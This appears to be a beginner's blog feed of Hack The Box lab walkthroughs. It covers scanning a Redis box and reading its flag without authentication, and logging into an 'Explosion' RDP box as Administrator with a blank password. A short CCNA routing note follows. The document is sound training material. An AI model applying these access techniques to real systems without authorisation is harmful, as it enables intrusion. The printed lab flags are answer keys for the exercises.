<p>This box was the most challenging one to crack so far, but I feel incredibly accomplished seeing my progress. I really enjoy writing about my experiences in this personal space, even though no one else is seeing it. I&rsquo;m practicing not to rely on external sources unless I&rsquo;ve tried everything I can on my own, and I&rsquo;m really glad I&rsquo;ve decided to do so. Working on this box has made me feel like I&rsquo;m going to remember every step I took to get the flag.</p>
<div style="text-align: center"><img src="./kermitthefrog-dance.gif" alt="frog_dancing"></div>
<hr>
<h5 id="task-1">TASK 1</h5>
<p>Which TCP port is open on the machine?</p>






<pre tabindex="0"><code>6379</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌─<span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>10.10.14.27<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-iwwc2qnr0i<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└──╼ <span style="color:#89dceb;font-weight:bold">[</span>★<span style="color:#89dceb;font-weight:bold">]</span>$ nmap -sC -sV 10.129.136.187
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Starting Nmap 7.93 <span style="color:#89dceb;font-weight:bold">(</span> https://nmap.org <span style="color:#89dceb;font-weight:bold">)</span> at 2024-06-18 04:24 BST
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Nmap scan report <span style="color:#cba6f7">for</span> 10.129.136.187
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Host is up <span style="color:#89dceb;font-weight:bold">(</span>0.027s latency<span style="color:#89dceb;font-weight:bold">)</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>All <span style="color:#fab387">1000</span> scanned ports on 10.129.136.187 are in ignored states.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>Not shown: <span style="color:#fab387">1000</span> closed tcp ports <span style="color:#89dceb;font-weight:bold">(</span>conn-refused<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>Nmap <span style="color:#cba6f7">done</span>: <span style="color:#fab387">1</span> IP address <span style="color:#89dceb;font-weight:bold">(</span><span style="color:#fab387">1</span> host up<span style="color:#89dceb;font-weight:bold">)</span> scanned in 0.71 seconds</span></span></code></pre></div>
<p>Initially, scanning ports on the target IP address did not reveal any open ports. Therefore, I had to expand my scan to include more ports. By default, Nmap scans only the most commonly used 1,000 ports, which are statistically the most likely to be open based on real-world usage. By adding the <code>-p-</code> option, Nmap scans all 65,535 ports on the target IP address. This extended scan revealed that port 6379/tcp is open.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌─<span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>10.10.14.27<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-iwwc2qnr0i<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└──╼ <span style="color:#89dceb;font-weight:bold">[</span>★<span style="color:#89dceb;font-weight:bold">]</span>$ nmap -sV -T4 10.129.136.187 -p-
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Starting Nmap 7.93 <span style="color:#89dceb;font-weight:bold">(</span> https://nmap.org <span style="color:#89dceb;font-weight:bold">)</span> at 2024-06-18 04:25 BST
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Nmap scan report <span style="color:#cba6f7">for</span> 10.129.136.187
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Host is up <span style="color:#89dceb;font-weight:bold">(</span>0.068s latency<span style="color:#89dceb;font-weight:bold">)</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Not shown: <span style="color:#fab387">65534</span> closed tcp ports <span style="color:#89dceb;font-weight:bold">(</span>conn-refused<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>PORT STATE SERVICE VERSION
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>6379/tcp open redis Redis key-value store 5.0.7
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>Nmap <span style="color:#cba6f7">done</span>: <span style="color:#fab387">1</span> IP address <span style="color:#89dceb;font-weight:bold">(</span><span style="color:#fab387">1</span> host up<span style="color:#89dceb;font-weight:bold">)</span> scanned in 37.48 seconds</span></span></code></pre></div>
<br/>
<h5 id="task-2">TASK 2</h5>
<p>which service is running on the port that is open on the machine?</p>






<pre tabindex="0"><code>redis</code></pre>
<br/>
<h5 id="task-3">TASK 3</h5>
<p>what type of database is Redis? Choose from the following options:</p>
<p>(i) In-memory Database, (ii) Traditional Database</p>






<pre tabindex="0"><code>In-memory Database</code></pre>
<p>Redis is known for its high performance. Storing data in memory allows Redis to achieve extremely low latency and high throughput compared to disk-based databases. It&rsquo;s commonly used as cache to speed up application performance by temporarily storing frequently accessed data.</p>
<br/>
<h5 id="task-4">TASK 4</h5>
<p>which command-line is used to interact with the Redis server? Enter the program name you would enter into the terminal without any arguments.</p>






<pre tabindex="0"><code>redis-cli</code></pre>
<p>To be able to interact with the Redis server, we need to download the <code>redis-cli</code> utility. It can be downloaded using the command below.</p>
<p><code>sudo apt install redis-tools</code></p>
<br/>
<h5 id="task-5">TASK 5</h5>
<p>which flag is used with the Redis command-line utility to specify the hostname?</p>






<pre tabindex="0"><code>-h</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>┌─<span style="color:#89dceb;font-weight:bold">[</span>us-starting-point-vip-1-dhcp<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>10.10.14.27<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>leewookb@htb-iwwc2qnr0i<span style="color:#89dceb;font-weight:bold">]</span>─<span style="color:#89dceb;font-weight:bold">[</span>~<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>└──╼ <span style="color:#89dceb;font-weight:bold">[</span>★<span style="color:#89dceb;font-weight:bold">]</span>$ redis-cli --help
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>redis-cli 7.0.10
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>Usage: redis-cli <span style="color:#89dceb;font-weight:bold">[</span>OPTIONS<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">[</span>cmd <span style="color:#89dceb;font-weight:bold">[</span>arg <span style="color:#89dceb;font-weight:bold">[</span>arg ...<span style="color:#89dceb;font-weight:bold">]]]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>-h &lt;hostname&gt; Server hostname <span style="color:#89dceb;font-weight:bold">(</span>default: 127.0.0.1<span style="color:#89dceb;font-weight:bold">)</span>.</span></span></code></pre></div>
<br/>
<h5 id="task-6">TASK 6</h5>
<p>Once connected to a Redis server, which command is used to obtain the information and statistics about the Redis server?</p>






<pre tabindex="0"><code>info</code></pre>
<p>The answer to this question was a bit challenging to find. A quick Google search would have provided it in seconds, but I wanted to challenge my self. After I got a successful connection with the Redis server, I typed the <code>help</code> command to gain some insights.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>10.129.136.187:6379&gt; <span style="color:#89dceb">help</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>redis-cli 7.0.10
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>To get <span style="color:#89dceb">help</span> about Redis commands type:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span><span style="color:#a6e3a1">&#34;help @&lt;group&gt;&#34;</span> to get a list of commands in &lt;group&gt;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span><span style="color:#a6e3a1">&#34;help &lt;command&gt;&#34;</span> <span style="color:#cba6f7">for</span> <span style="color:#89dceb">help</span> on &lt;command&gt;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span><span style="color:#a6e3a1">&#34;help &lt;tab&gt;&#34;</span> to get a list of possible <span style="color:#89dceb">help</span> topics
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span><span style="color:#a6e3a1">&#34;quit&#34;</span> to exit</span></span></code></pre></div>
<p>The output indicated that <code>help &lt;tab&gt;</code> command would list possible help topics. Each time I pressed the tab key, the topic changed. Then I found <code>@server</code> topic, which seemed promising since I was looking for a command to obtain the information and statistics about the Redis server.</p>






<pre tabindex="0"><code>10.129.136.187:6379&gt; help @server</code></pre>
<p>As I scrolled through the output of the command, I found the answer I was looking for.</p>
<div style="text-align: center"><img src="./image1.png"></div>
<br/>
<h5 id="task-7">TASK 7</h5>
<p>What is the version of the Redis server being used on the target machine?</p>






<pre tabindex="0"><code>5.0.7</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>10.129.136.187:6379&gt; info
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span><span style="color:#6c7086;font-style:italic"># Server</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>redis_version:5.0.7
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>redis_git_sha1:00000000
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>redis_git_dirty:0</span></span></code></pre></div>
<br/>
<h5 id="task-8">TASK 8</h5>
<p>Which command is used to select the desired database in Redis?</p>






<pre tabindex="0"><code>select</code></pre>
<div style="text-align: center"><img src="./image2.png"></div>
<br/>
<h5 id="task-9">TASK 9</h5>
<p>How many keys are present inside the database with index 0?</p>






<pre tabindex="0"><code>4</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>10.129.136.187:6379&gt; dbsize
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span><span style="color:#89dceb;font-weight:bold">(</span>integer<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#fab387">4</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>10.129.136.187:6379&gt;</span></span></code></pre></div>
<br />
<h5 id="task-10">TASK 10</h5>
<p>Which command is used to obtain all the keys in a database?</p>






<pre tabindex="0"><code>keys *</code></pre>
<div style="text-align: center"><img src="./image4.png"></div>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>10.129.136.187:6379&gt; keys *
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>1. <span style="color:#a6e3a1">&#34;temp&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>2. <span style="color:#a6e3a1">&#34;numb&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>3. <span style="color:#a6e3a1">&#34;flag&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>4. <span style="color:#a6e3a1">&#34;stor&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>   10.129.136.187:6379&gt;</span></span></code></pre></div>
<br/>
<h5 id="submit-flag">SUBMIT FLAG</h5>
<p>submit root flag</p>






<pre tabindex="0"><code>03e1d2b376c37ab3f5319922053953eb</code></pre>
<div style="text-align: center"><img src="./image5.png"></div>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>10.129.136.187:6379&gt; get flag
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span><span style="color:#a6e3a1">&#34;03e1d2b376c37ab3f5319922053953eb&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>10.129.136.187:6379&gt;</span></span></code></pre></div>
]]></content:encoded>
    </item>
    <item>
      <title>[TIL] Explosion</title>
      <link>http://localhost:1313/htb-explosion/</link>
      <pubDate>Tue, 18 Jun 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/htb-explosion/</guid>
      <description>some thoughts:
It was really fascinating when I first tried connecting to an RDP server. I just typed a few appropriate commands in the terminal CLI, and suddenly a small screen popped up over the terminal, displaying the Windows desktop screen. It might seem like no big deal to some, but for me, it was an amazing experience. It showed me how powerful these commands and knowing various server protocols can be.</description>
      <content:encoded><![CDATA[<p>some thoughts:</p>
<p>It was really fascinating when I first tried connecting to an RDP server. I just typed a few appropriate commands in the terminal CLI, and suddenly a small screen popped up over the terminal, displaying the Windows desktop screen. It might seem like no big deal to some, but for me, it was an amazing experience. It showed me how powerful these commands and knowing various server protocols can be.
If felt like an explosion inside my brain! just like the name of the box.</p>
<div style="text-align: center"><img src="./explode-explosion.gif"></div>
<hr>
<h5 id="task-1">TASK 1</h5>
<p>What does 3-letter acronym RDP stand for?</p>






<pre tabindex="0"><code>Remote Desktop Protocol</code></pre>
<p>Remote Desktop Protocol (RDP) is a proprietary protocol developed by Microsoft, allowing users to connect to and control a remote computer over a network connection.</p>
</br>
<h5 id="task-2">TASK 2</h5>
<p>What is a 3-letter acronym that refers to interaction with the host through a command line interface?</p>






<pre tabindex="0"><code>CLI</code></pre>
</br>
<h5 id="task-3">TASK 3</h5>
<p>What about graphical user interface interactions?</p>






<pre tabindex="0"><code>GUI</code></pre>
<br/>
<h5 id="task-4">TASK 4</h5>
<p>What is the name of an old remote access tool that came without encryption by default and listens on TCP port 23?</p>






<pre tabindex="0"><code>Telnet</code></pre>
<p>Telnet is one of the oldest protocols, established in 1969. By default, Telnet operates over TCP port 23. One of Telnet&rsquo;s main drawbacks is that it transmits data, including login credentials, in plaintext. This lack of encryption makes it vulnerable to eavesdropping and man-in-the-middle attacks, which is why it has largely been replaced by more secure protocols like SSH (Secure Shell).</p>
<br/>
<h5 id="task-5">TASK 5</h5>
<p>What is the name of the service running on port 3389 TCP?</p>






<pre tabindex="0"><code>ms-wbt-server</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop/HTB/connections<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└─$ nmap -sV 10.129.1.13 -p <span style="color:#fab387">3389</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Starting Nmap 7.94SVN <span style="color:#89dceb;font-weight:bold">(</span> https://nmap.org <span style="color:#89dceb;font-weight:bold">)</span> at 2024-06-18 12:12 EDT
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Nmap scan report <span style="color:#cba6f7">for</span> 10.129.1.13
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Host is up <span style="color:#89dceb;font-weight:bold">(</span>0.034s latency<span style="color:#89dceb;font-weight:bold">)</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>PORT STATE SERVICE VERSION
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>3389/tcp open ms-wbt-server Microsoft Terminal Services
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>Nmap <span style="color:#cba6f7">done</span>: <span style="color:#fab387">1</span> IP address <span style="color:#89dceb;font-weight:bold">(</span><span style="color:#fab387">1</span> host up<span style="color:#89dceb;font-weight:bold">)</span> scanned in 6.45 seconds
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>As you can see from the output, the ms-wbt-server service is running on port 3389/TCP.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>Also, I am using my Kali-Linux VM since I have used up all of my Pwnbox <span style="color:#89dceb">time</span> on Hack The Box.</span></span></code></pre></div>
</br>
<h5 id="task-6">TASK 6</h5>
<p>What is the switch used to specify the target host&rsquo;s IP address when using xfreerdp?</p>






<pre tabindex="0"><code>/v:</code></pre>
<div style="text-align: center"><img src="./image7.png"></div>
<br/>
<h5 id="task-7">TASK 7</h5>
<p>What username successfully returns a desktop projection to us with a blank password?</p>






<pre tabindex="0"><code>Administrator</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>/cert-ignore <span style="color:#89dceb;font-weight:bold">[</span>deprecated, use /cert:ignore<span style="color:#89dceb;font-weight:bold">]</span> Ignore
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>certificate</span></span></code></pre></div>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>/u:<span style="color:#89dceb;font-weight:bold">[[</span>&lt;domain&gt;<span style="color:#89b4fa">\]</span>&lt;user&gt;|&lt;user&gt;<span style="color:#89dceb;font-weight:bold">[</span>@&lt;domain&gt;<span style="color:#89dceb;font-weight:bold">]]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>Username</span></span></code></pre></div>
<div style="text-align: center"><img src="./image8.png"></div>
<div style="text-align: center"><img src="./image9.png"></div>
<p>I was discovered useful switch options through the <code>xfreerdp --help</code> command, but I had no idea how to find a specific username that would allow me to connect to the RDP server with a blank password, as the RDP session was not accepting my own username. I had to look up the write-up provided by HTB, which revealed that the username was Administrator. Now that I know the username, I thought to myself, why didn&rsquo;t I think of trying &lsquo;<code>Administrator</code>&rsquo;?
The final command <code>xfreerdp /v:10.129.1.13 /cert-ignore /u:Administrator</code> connected me to the RDP server with a blank password.</p>
</br>
<h5 id="submit-flag">SUBMIT FLAG</h5>
<p>Submit root flag</p>






<pre tabindex="0"><code>951fa96d7830c451b536be5a6be008a0</code></pre>
<div style="text-align: center"><img src="./image10.png"></div>
<div style="text-align: center"><img src="./image11.png"></div>
]]></content:encoded>
    </item>
    <item>
      <title>[TIL] Routing</title>
      <link>http://localhost:1313/til-routing/</link>
      <pubDate>Tue, 18 Jun 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/til-routing/</guid>
      <description>I&amp;rsquo;m currently studying for the CCNA exam, primarily using Jeremy&amp;rsquo;s IT Lab YouTube channel. He&amp;rsquo;s well-known for providing great CCNA content, and the best part is that it&amp;rsquo;s all free on YouTube. Jeremy also offers Anki flashcards, which I absolutely love and use daily, as well as Cisco Packet Tracer, which is an excellent resource for hands-on practice. I plan to take the exam in 3 to 4 months, though this timeline might change depending on my study and preparation progress.</description>
      <content:encoded><![CDATA[<p>I&rsquo;m currently studying for the CCNA exam, primarily using Jeremy&rsquo;s IT Lab YouTube channel. He&rsquo;s well-known for providing great CCNA content, and the best part is that it&rsquo;s all free on YouTube. Jeremy also offers Anki flashcards, which I absolutely love and use daily, as well as Cisco Packet Tracer, which is an excellent resource for hands-on practice. I plan to take the exam in 3 to 4 months, though this timeline might change depending on my study and preparation progress.</p>
<p>Today, I learned about routing.</p>
<h3 id="what-is-routing">What is Routing?</h3>
<hr>
<p>Definition:</p>
<blockquote>
<p>Routing is the process that routers use to determine the path that IP packets should take over a network to reach their destination.</p>
</blockquote>
<p>When a router receives a packet, it&rsquo;s the router&rsquo;s job to forward it to the correct destination.</p>
<p>Routers store routes to all of their known destinations in a <code>Routing table</code>.</p>
<p>Switches keep a MAC address table with their known destination MAC addresses, and routers keep a routing table with their known destination networks.</p>
<p>When routers receive packets, they look in the routing table to find the best route to forward the packet.</p>
<p>There are two main routing methods:</p>
<ul>
<li>
<p><code>dynamic routing</code>: Routers use dynamic protocols (i.e., OSPF) to share routing information with each other automatically and build their routing tables.</p>
</li>
<li>
<p><code>static routing</code>: A network engineer/admin manually configures routes on the router.
But before we go into routing methods,</p>
</li>
</ul>
